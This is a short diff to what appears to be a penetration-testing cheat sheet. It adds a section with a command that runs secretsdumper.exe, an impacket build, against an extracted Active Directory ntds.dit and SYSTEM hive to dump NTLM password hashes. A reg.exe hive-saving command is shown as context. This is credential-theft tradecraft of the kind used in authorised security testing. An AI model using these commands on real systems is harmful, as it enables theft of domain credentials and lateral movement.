@@ -2084,6 +2084,13 @@ Remember and not use C:\Windows\ntds\ntds.dit
 reg.exe save hklm\system c:\m0chan\SYSTEM.bak
 ```
 
+#### [](#header-4) SecretsDumper Windows
+
+```powershell
+#https://github.com/maaaaz/impacket-examples-windows
+secretsdumper.exe -ntds ~/Extract/ntds.dit -system ~/Extract/SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
+```
+
 
 
 ## [](#header-2)Persistance
